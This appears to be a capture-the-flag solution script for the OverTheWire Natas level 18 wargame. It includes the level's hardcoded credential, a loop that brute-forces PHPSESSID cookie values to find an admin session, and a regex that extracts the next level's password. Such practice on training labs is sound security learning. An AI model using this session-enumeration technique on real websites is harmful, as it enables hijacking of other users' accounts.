#Import Library
import requests
import re
from string import *
from time import time

#Setting variables needed
username = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

url = f'http://{username}.natas.labs.overthewire.org/'
pw = []
flag = True
characters = ascii_letters + digits

# Connect to natas
session = requests.Session()

#To find Session ID
'''for i in range(1,641):
    payloads={"username" : 'admin', "password" : 'aa'}
    response = session.request('POST', url, auth=(username,password),
                               data=payloads, cookies={"PHPSESSID":str(i)})
    if "You are an admin" in response.text:
        print(f"Got it Session ID {i}")
    else:
        print("tried" + str(i))'''
        
payloads={"username" : 'admin', "password" : 'aa'}
response = session.request('POST', url, auth=(username,password),
                            data=payloads, cookies={"PHPSESSID":"119"})
#print(''.join(pw))

#Filtering to get a password
#result = response.text
result = re.findall('Password: (.*)</pre>', response.text)[0]

print(result)
